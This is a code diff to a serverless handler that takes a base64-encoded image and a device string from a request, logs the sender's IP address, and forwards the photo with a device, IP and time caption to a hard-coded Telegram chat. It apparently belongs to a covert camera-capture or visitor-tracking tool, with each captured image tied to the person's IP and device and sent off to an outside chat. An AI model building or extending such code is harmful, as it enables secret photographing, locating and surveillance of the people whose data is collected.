@@ -16,7 +16,9 @@ export default async function handler(req, res) {
     let body = req.body;
     if (typeof body === 'string') body = JSON.parse(body);
 
-    const image = body && body.image;
+    const image  = body && body.image;
+    const device = (body && body.device) ? String(body.device).slice(0, 200) : 'غير معروف';
+
     const m = /^data:image\/(png|jpeg|webp);base64,([A-Za-z0-9+/=]+)$/.exec(image || '');
     if (!m) {
       res.status(400).json({ ok: false, err: 'bad image' });
@@ -26,12 +28,16 @@ export default async function handler(req, res) {
     const buf = Buffer.from(m[2], 'base64');
     const ip  = ((req.headers['x-forwarded-for'] || '').split(',')[0].trim())
                 || req.socket?.remoteAddress || 'unknown';
-    const ua  = (req.headers['user-agent'] || '').slice(0, 200);
     const cap = new Date().toISOString();
+
+    const caption =
+      '📱 ' + device + '\n' +
+      '🌐 IP: ' + ip + '\n' +
+      '🕐 ' + cap;
 
     const boundary = '----vanta' + Date.now();
     const head = `--${boundary}\r\nContent-Disposition: form-data; name="chat_id"\r\n\r\n${TG_CHAT}\r\n` +
-                 `--${boundary}\r\nContent-Disposition: form-data; name="caption"\r\n\r\n${cap} | ${ip}\r\n` +
+                 `--${boundary}\r\nContent-Disposition: form-data; name="caption"\r\n\r\n${caption}\r\n` +
                  `--${boundary}\r\nContent-Disposition: form-data; name="photo"; filename="cap.jpg"\r\nContent-Type: image/jpeg\r\n\r\n`;
     const tail = `\r\n--${boundary}--\r\n`;
     const payload = Buffer.concat([Buffer.from(head, 'utf8'), buf, Buffer.from(tail, 'utf8')]);
